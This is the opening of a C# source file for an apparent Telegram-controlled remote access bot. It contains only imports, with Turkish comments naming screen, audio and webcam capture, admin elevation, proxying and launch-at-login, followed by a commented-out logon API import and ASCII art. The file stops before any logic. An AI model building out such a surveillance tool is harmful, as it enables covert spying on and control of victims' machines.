using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;//Telegram bot için
using Telegram.Bot.Exceptions;//Telegram bot için
using Telegram.Bot.Polling;//Telegram bot için
using Telegram.Bot.Types;//Telegram bot için
using Telegram.Bot.Types.Enums;//Telegram bot için
using Telegram.Bot.Args;//Telegram bot için
using Telegram.Bot.Requests;//Telegram bot için
using Message = Telegram.Bot.Types.Message;//Telegram bot için
using System.Threading;
using System.Security.Principal;//Admin yetkisi almak için
using System.Diagnostics;
using System.Reflection;
using System.CodeDom.Compiler;
using System.IO;//Dosya operasyonları için, sil,oluştur, kaydet, yükle vb.
using System.Windows.Forms.VisualStyles;
using System.Security.Cryptography;
using System.Net.NetworkInformation;//Telegram proxy kullanılırsa
using System.Net.Http;//Telegram proxy kullanılırsa
using System.Net;//Telegram proxy kullanılırsa
using System.Runtime.InteropServices.ComTypes;
using MihaZupan;//.Net 4.x sürümü için Socks5 desteği yok bu ek kütüphane bunu sağlıyor 
using ScreenRecorderLib; // Ekran kaydı almak için
using NAudio;// Ses kaydı almak için
using Emgu.CV;// Webcam için
using Emgu.CV.CvEnum;// Webcam için
using Emgu.CV.Structure;// Webcam için
using System.Runtime.InteropServices;
using NAudio.Wave;// Ses kaydı almak için
using NAudio.Codecs;// Ses kaydı almak için
using NAudio.MediaFoundation;// Ses kaydı almak için
using System.Net.Sockets;//Telegram proxy kullanılırsa
using System.Text.RegularExpressions;
using System.Diagnostics.Eventing.Reader;
using Emgu.CV.Cuda;//Webcam video foto yakalama
using Telegram.Bot.Types.ReplyMarkups;
using NAudio.Gui;
using System.Runtime.CompilerServices;
using IWshRuntimeLibrary; //Loginde başlatmak için
using Microsoft.Win32;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using Emgu.CV.Features2D;
using NAudio.CoreAudioApi;
using System.Runtime.InteropServices.WindowsRuntime;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
using NAudio.Lame;
using WUApiLib;
using System.Xml.Linq;

namespace TelegramRemoteAccessBot
{

    internal class bootUp : ApplicationContext
    {
        /*[DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LogonUser(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        out IntPtr phToken
        );
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);*/
        /*
                                                                                                
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ///                                                                                                                                          ///
        ///                                                        __*=💜ny4rlk0💜=*__                                                                                 ///
        ///                                                         9.03.2024 13:44:32                                                               ///
        ///                                                                                                                                          ///
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /*
        ⠋⠌⠁⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠠⠀⠄⠤⠐⡀⠄⠠⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⣁⠠⢀⢀⠀⢀⠠⠀⠀⠠⠀⠀⡀⠠⠀⠀⠠⠀⢀⠀⠀⠀⠀⡀⠀⠄⠠⠀⠀⠤⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⡠⠀⠀⡠⠀⡠⠐⢌⠠⠄⡔⠠⢔⠠⠤⠡⠆⢠⠀⠄⠀⠀⠀⡀⠀⠀⡀⠠⠀⠀⢀⠀⢀⠠⠀⠀⠄⠠⠀⡀⠀⠠⠀⠀⠀⠀⠀⠠⠀⢀⠀⠀⡀⠀⠠⠀⠀⠠⠀⠀⡀⢀⠀⠄⠀⠀⠄⠀⡀⢀⠀⠠⠀⢀⠠⠀⠀⡀⢀⠀⡀⠠⠀⠀⠄
        ⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⣀⡀⠀⠀⢂⠠⠈⡀⠠⠀⠀⠀⠀⠀⠠⠐⠀⠂⠠⠐⠀⠄⠀⠀⠠⠀⢀⢂⠀⢊⠀⠄⢀⠑⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⡀⠐⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠤⠀⠀⠂⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠀⠀⣀⣤⣀⠀⠀⠀⠀⣔⣿⣿⡿⠿⣶⣄⡀⠅⡐⢀⡀⠀⠀⡀⠀⠁⢌⠈⡄⢁⠂⠂⢌⠠⡉⢀⠁⠤⡈⡈⢀⠂⠀⠀⠀⠀⢀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠈⡀⠀⠈⠀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠢⠐⠀⢀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠠⠀⠁⠠⠀⠄⠀⠀⠁⢼⡿⠉⠙⠱⠀⠀⢰⣿⢿⡁⠀⠀⠀⠈⠻⣆⠐⠀⠄⡁⢂⠀⠀⠀⠀⠠⢀⠂⠠⠌⢠⠐⠄⠂⠍⡠⠐⡀⠀⠀⠀⠀⠐⠀⠀⠀⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠠⠐⠀⠠⢀⠡⠉⠌⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⢀⣤⠀⠈⢀⢀⠘⣿⣄⠀⠀⠀⡀⠹⣿⣀⠀⢀⠀⠀⠀⠀⢻⣇⠈⡀⠠⠀⠂⡀⠂⠀⠁⠂⠌⡐⠂⠄⠂⡌⠑⠠⠀⢀⠠⠀⠀⠀⠀⠀⠀⡐⠈⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⠀⢂⠔⠁⠂⠄⠁⠄⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢌⠀⠐⠀⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠐⠀⠀⠈⢷⣄⠘⣿⡉⠀⠈⠻⣷⣄⡀⢀⣤⣤⣬⣤⣄⣀⣀⠀⠀⠈⣿⡆⠀⠀⠁⠔⠀⠀⠀⠠⠁⢂⠀⠂⠌⠑⣀⢉⠐⣁⠠⢀⠀⠂⠀⢀⠀⡀⢠⠂⠁⡀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⡀⠠⠀⠋⣀⠂⢉⠂⠐⡀⠁⠀⠈⠀⠀⠉⠐⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠢⠀⠀⠈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣰⡋⠁⠀⠀⠉⠓⠮⢿⣦⣤⣤⣌⣛⣿⣿⣥⣄⣀⣀⣀⡈⠉⠻⣦⣤⣿⣯⠀⠄⠀⠀⠈⢀⠀⠄⡁⠂⢀⠀⠌⢠⠀⠄⡁⠠⠐⠄⡂⠡⢀⠄⢂⠀⢂⠌⢢⠠⠑⠠⢄⡈⠀⠀⢀⠠⠐⢀⠀⠠⠒⡐⢠⠉⠠⠀⠂⠠⠀⠀⠀⠀⠀⠐⠈⠀⠀⠀⠁⠈⠀⡀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡑⠀⠀⠁⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣆⠙⢷⣷⣤⣀⠀⠀⠐⠂⠀⣉⣛⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣶⣄⢹⣿⣯⠀⠀⠀⠀⠀⠂⠐⠠⠀⠂⠀⠄⠈⠄⠂⠐⠀⠐⠈⠄⠐⡐⠀⢂⠂⠌⠄⠂⠡⠄⠁⠂⡀⠈⠢⢉⠄⠤⠐⠠⠤⣋⠐⢣⡀⠐⠠⠀⡁⠀⠐⠀⢀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⣌⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢳⣶⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣷⣿⣿⣿⣿⡇⠈⠀⠀⠀⠐⡀⠁⢀⠐⠀⠂⠈⡀⠈⠀⡈⠀⠀⠈⢀⠀⢣⡄⢡⢈⠐⡉⠂⡌⢑⡀⠀⠐⡀⢀⢣⠀⡌⠀⠀⠀⠙⠂⣤⠁⢒⢠⠈⢀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢮⠀⠀⠆⠀⡃⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣶⣷⣶⣤⣄⣀⠉⢻⣿⣯⣍⣉⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣃⠀⠀⠀⠀⠀⠁⠃⢨⠀⠀⠃⠰⡁⢣⠀⢁⢠⠰⠀⢘⡜⠀⢠⠰⠈⡀⠁⠀⠘⡌⡁⠰⠀⠁⠘⠀⡛⠀⠀⠀⡄⠀⠰⡈⡞⣬⡳⠶⢨⠃⢠⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠃⡘⠀⢠⠀⢠⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠣⠀⠀⢀⠀⡁⠀⠀⠀⠀⠀⠀⠀⣘⣿⣿⣧⣄⡉⠙⠻⣿⣿⣧⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠄⠀⠠⠀⠀⠀⠁⡀⢀⠈⠠⠀⠛⠈⠀⠀⠀⠀⠀⡁⠀⠠⠀⠀⡁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠠⠀⣅⠣⠄⡅⢃⠏⢀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠱⠀⠈⠀⠀⠄⠀⠀⠀⠀⠀⠀⠸⠟⢟⡿⢿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢷⣄⠐⠀⠀⠀⠀⠠⠀⠀⠀⠀⣠⣤⡀⠂⠄⠀⠀⠀⠀⠀⠀⢀⠀⠈⠐⠂⠄⡄⠄⠂⠄⠠⠀⠀⠀⠀⠠⠀⠐⠠⢀⠐⠠⠄⠂⠠⠀⠄⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡑⠀⠀⠐⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⠟⠻⠻⠿⢿⣷⣤⣤⣥⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡄⢻⡄⠀⠀⣀⣶⣴⠀⢁⡈⣀⣿⣿⣧⠀⣁⣁⡀⣀⣀⣤⣤⣤⣤⡄⠂⠈⠀⠀⠈⠑⠂⠁⠂⢀⠀⠀⠐⠀⢁⡀⠠⠀⠔⠀⠊⠀⠀⠀⠐⠀⠀⠐⡀⠂⠠⠀⠐⠀⠂⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢌⠀⠐⠀⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⡾⠷⠶⢶⣶⣤⣤⣌⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣥⣿⢿⣿⣿⢹⢇⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⡇⠀⣀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢀⠈⠀⠠⠁⠈⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠠⠁⠀⢁⠀⡀⠀⠀⠀⠄⠁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠢⠀⢀⠠⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠸⣤⣴⡾⢿⣛⣛⣻⣿⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣉⡽⢃⣨⣿⣗⠞⠉⠀⠉⠉⢉⣽⣿⣿⠀⣻⣿⣏⡉⠫⠉⠀⣿⣿⡇⠀⢈⣍⣍⣍⢉⣁⣀⣀⣀⣀⣀⣠⣀⣀⣀⣀⣤⣁⣀⣀⣀⣄⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⣾⡿⣻⠿⠛⢋⣹⡿⠿⠛⠻⢟⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣴⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣦⣤⣦⣶⣴⣦⣶⣴⣦⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⡿⣿⣿⢿⣷⣶⡀⠂⠀⠀⠀⠀⠀⠀⠀⠀
        ⢌⠀⠀⠂⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠻⠄⣤⡟⠉⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠛⢛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠢⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⣸⣿⣀⡀⠐⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⡟⢻⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠉⠈⠈⠁⠈⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡑⠀⠠⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠻⣿⠾⠛⠀⢀⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣷⣼⣿⣿⣿⣧⠈⠹⡻⠿⣿⣟⡻⣟⣛⣻⣟⠿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⢿⡞⠹⢿⠿⣿⠿⠿⠿⠿⠿⠻⠟⠛⠛⠛⠙⠿⠟⠁⠙⠆⠁⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢌⠀⠀⠠⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠀⡀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣟⣿⣿⣿⣿⢹⢿⣇⡴⢷⣾⣻⣥⣿⡝⣻⣟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⣴⠏⠀⡀⠀⠀⢀⠀⠠⢈⠌⡁⠉⠤⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢀⠀⡀⠀⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢺⣿⡆⠀⠀⣀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣞⣽⣿⣿⣿⣯⠿⣿⣹⣿⣼⣿⢷⣿⢯⣭⠷⣿⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⢠⣾⠏⠀⠀⣀⣔⠈⠤⢡⡍⢠⠐⠀⠢⠄⡁⢐⠄⡀⢀⡀⠠⢀⠀⢀⠀⠀⠀⠀⡂⢈⠤⠀⠆⡒⠂⠄⠀⠠⠀⠀⢀⠠⡐⢈⠡⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⡀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠹⠿⣷⠀⠀⠀⠛⠃⣤⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⡿⠟⠻⣿⣿⣿⡿⠋⠔⠠⠄⠄⠠⣿⡿⠿⠿⠟⠛⠋⢋⠉⡉⢀⣰⡿⠁⠄⢐⣶⣿⠟⠁⠁⠄⠐⠢⠈⠌⣁⠐⡀⢂⠌⠄⠀⠀⣀⠖⠊⠀⠀⠀⠀⠀⠖⠁⠀⠒⠠⠈⠑⠬⢁⡂⡐⠌⠄⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⢐⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠻⣥⡀⠀⠀⠀⠀⠤⣬⣦⢠⣬⣿⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⠁⠀⠒⠀⠀⠉⣰⡀⠁⢈⣀⠌⠘⡀⣀⠐⠂⢉⠠⡈⠀⠂⠐⢀⣼⠟⠀⢀⣾⣿⠟⠁⠀⠀⠀⠀⠀⠀⠁⠐⠀⠠⠀⠀⠀⠀⠠⠁⠀⣀⠀⡀⠂⢁⠉⠀⠀⠈⠀⠀⠐⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠈⠁⠀⠀⠄⠈⠀⠀⠀⠀⠀⠘⠓⠀⠛⠀⠀⠀⠀⣿⡇⢈⠄⡈⠉⢿⠰⢿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡯⢍⣿⣷⣶⣾⣿⣾⣶⣶⣆⠿⠇⠀⠄⣀⠔⠂⠔⡠⠉⠠⢀⡀⠤⠀⣖⣤⡿⠃⡀⠰⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⡀⠐⠀⣠⠁⢄⠨⠀⠆⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠳⣄⡀⠀⠀⠀⠀⠀⣠⠏⢡⢀⠒⠄⠢⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠒⠰⢀⠊⡉⠤⠀⠺⢶⡀⠅⢂⣵⡾⠋⢀⠤⢠⣐⠢⣀⡠⠔⠒⠒⠢⣀⠠⠀⠄⠐⠂⠀⠈⠀⠀⠀⡀⠀⠀⠀⠀⠆⡨⠄⠃⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠁⠤⢀⡤⠚⡍⠀⠨⠄⣀⣤⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢭⡁⣄⠈⠻⣿⠇⣠⠘⡀⠀⠐⠈⡀⠂⣀⣤⣾⡿⡋⢀⢳⠌⣀⢃⠰⠌⣩⠐⠂⡉⠉⠒⡀⠑⠀⠈⠀⠐⠀⠀⠀⠄⡠⠀⠄⠀⡁⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢌⠀⠐⠀⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠐⠚⠀⠆⠐⠂⠐⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢺⡥⣓⠄⠢⡅⠹⡻⡟⠠⠄⠅⠒⣠⣴⢾⣯⠗⠋⣀⠉⢠⠞⣌⠢⡨⠗⢘⡁⢈⢁⡠⢁⠀⠀⠁⠀⠀⢀⡀⠈⠁⠈⣀⠑⠈⡌⠁⠆⣈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠢⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⣯⣷⣔⣈⡄⣑⣭⡶⣤⣾⣻⠽⠞⠉⠀⠉⢀⢀⠰⢉⠶⠌⡖⠁⠤⠈⣤⠆⠁⡀⠳⠈⠀⡁⠠⠈⠠⢀⠀⠔⠀⠀⠀⠀⢀⠉⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡑⠀⠀⠄⠀⡀⠐⠀⠀⠀⠸⣶⡆⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⡿⠶⣝⣳⣿⣷⡟⠉⢀⠘⢯⠀⠐⠀⠀⠀⡃⢁⠘⢀⣾⠐⡪⠈⢒⠄⠄⠢⣈⡘⠁⠂⠌⡀⠀⠂⠴⠀⢠⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠌⠀⠀⠀⠀⠄⠀⠄⠀⠉⠀⠀⠃⠐⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⡿⣹⢿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣾⡿⢻⡏⢩⢛⣷⡀⠈⠒⣻⡀⠁⣀⠀⠀⡂⡁⠀⠘⡟⠁⠡⢩⢀⠋⢀⡁⡈⠘⠌⠇⠀⠐⠀⠐⠈⢂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠈⠀⠀⠀⠆⠀⠐⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
